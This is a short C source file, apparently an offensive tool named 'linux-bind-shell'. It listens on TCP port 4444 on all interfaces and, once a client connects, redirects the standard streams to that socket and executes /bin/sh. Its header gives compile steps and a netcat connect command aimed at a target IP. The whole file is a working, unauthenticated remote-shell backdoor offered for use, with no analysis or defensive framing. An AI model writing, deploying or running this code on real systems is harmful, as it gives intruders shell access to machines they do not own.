#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

/*
 * linux-bind-shell - Linux TCP Bind Shell
 *
 * Compile:  gcc main.c -o bind_shell
 * Connect:  nc <target_ip> 4444
 */

// -- CONFIGURE --------------------------------------------
#define BIND_PORT 4444
// ---------------------------------------------------------

int main(void) {
    int srv, cli;
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);

    srv = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(BIND_PORT);

    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    bind(srv, (struct sockaddr *)&addr, sizeof(addr));
    listen(srv, 1);

    cli = accept(srv, (struct sockaddr *)&addr, &len);

    dup2(cli, 0);
    dup2(cli, 1);
    dup2(cli, 2);

    execve("/bin/sh", NULL, NULL);
    close(srv);
    return 0;
}
